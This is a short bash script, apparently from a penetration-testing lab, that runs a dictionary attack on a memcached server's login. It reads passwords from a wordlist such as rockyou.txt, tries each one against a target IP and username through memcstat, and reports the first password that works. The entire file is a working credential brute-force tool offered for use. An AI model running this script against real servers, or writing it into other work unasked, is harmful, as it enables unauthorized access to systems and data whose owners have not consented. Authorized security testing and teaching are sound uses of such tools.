#! /bin/bash

# Usage ./memcache-dictionary-attack.sh <target> <username> <password>
# Eg. ./memcache-dictionary-attack.sh 192.104.149.3 student /usr/share/wordlists/rockyou.txt

while read F ; do
echo "Trying $F"
    if memcstat --servers=$1 --username=$2 --password=$F | grep -q Server ; then
    echo "Password Found: "$F
    break
fi
done < $3
